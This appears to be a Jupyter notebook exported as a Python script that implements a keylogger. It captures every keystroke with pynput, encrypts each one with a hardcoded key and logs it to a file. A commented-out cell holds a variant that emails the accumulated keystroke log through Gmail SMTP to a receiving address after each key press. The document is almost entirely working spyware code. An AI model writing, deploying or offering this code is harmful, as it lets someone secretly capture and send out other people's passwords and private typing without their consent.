#!/usr/bin/env python
# coding: utf-8

# In[ ]:


from pynput.keyboard import Listener, Key
import logging
from cryptography.fernet import Fernet

# Set the log file path
log_file = "C:\\Users\\vik\\Desktop\\project_2\\mylog.txt"

# Configure the logger
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

# Generate encryption key
encryption_key = b'I9qf4guuRucF1qdxok8s3tJ5lV+GzrYXjL7pCeBnvwQ='

# Initialize Fernet cipher with the encryption key
cipher = Fernet(encryption_key)


def encrypt_message(message):
    encrypted_message = cipher.encrypt(message.encode())
    return encrypted_message


def decrypt_message(encrypted_message):
    decrypted_message = cipher.decrypt(encrypted_message)
    return decrypted_message.decode()


# Define the callback function for key press events
def on_press(key):
    if hasattr(key, 'char'):
        # Handle alphanumeric characters
        encrypted_char = encrypt_message(key.char)
        logging.info(encrypted_char)
        print(decrypt_message(encrypted_char), end="")
    elif key == Key.space:
        # Handle space character
        encrypted_char = encrypt_message(' ')
        logging.info(encrypted_char)
        print(decrypt_message(encrypted_char), end="")
    elif key == Key.enter:
        # Handle enter key
        encrypted_char = encrypt_message('\n')
        logging.info(encrypted_char)
        print(decrypt_message(encrypted_char))
    elif key == Key.tab:
        # Handle tab key
        encrypted_char = encrypt_message('\t')
        logging.info(encrypted_char)
        print(decrypt_message(encrypted_char), end="")
    else:
        # Handle special characters
        encrypted_char = encrypt_message(str(key).replace("'", ""))
        logging.info(encrypted_char)
        print(decrypt_message(encrypted_char), end="")


# Create a listener
with Listener(on_press=on_press) as listener:
    listener.join()


# In[ ]:





# In[ ]:


# import smtplib
# from email.mime.text import MIMEText
# from email.mime.multipart import MIMEMultipart
# from pynput.keyboard import Listener, Key
# import logging

# # Set the log file path
# log_file = "C:\\Users\\vik\\Desktop\\project_2\\mylog.txt"

# # Set email credentials and parameters
# sender_email = "Sender email address"  # Sender email address
# sender_password = "Sender email password"  # Sender email password
# receiver_email = "Recipient email address"  # Recipient email address
# subject = "Keylogger Data"  # Email subject

# # Configure the logger
# logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

# # Define the callback function for key press events
# def on_press(key):
#     if hasattr(key, 'char'):
#         # Handle alphanumeric characters
#         logging.info(key.char)
#         print(key.char, end="")
#     elif key == Key.space:
#         # Handle space character
#         logging.info(' ')
#         print(" ", end="")
#     elif key == Key.enter:
#         # Handle enter key
#         logging.info('\n')
#         print("\n")
#     elif key == Key.tab:
#         # Handle tab key
#         logging.info('\t')
#         print("\t", end="")
#     else:
#         # Handle special characters
#         logging.info(str(key).replace("'", ""))
#         print(str(key).replace("'", ""), end="")
    
#     # Send email with captured data
#     with open(log_file, 'r') as file:
#         data = file.read()
#     send_email(data)

# # Function to send email
# def send_email(body):
#     # Create email message
#     message = MIMEMultipart()
#     message["From"] = sender_email
#     message["To"] = receiver_email
#     message["Subject"] = subject
#     message.attach(MIMEText(body, "plain"))

#     # Send email
#     with smtplib.SMTP("smtp.gmail.com", 587) as server:
#         server.starttls()
#         server.login(sender_email, sender_password)
#         server.sendmail(sender_email, receiver_email, message.as_string())

# # Create a listener
# with Listener(on_press=on_press) as listener:
#     listener.join()


# In[ ]:


# to generate an encryption key
# from cryptography.fernet import Fernet

# encryption_key = Fernet.generate_key()
# print(encryption_key)


# In[ ]:




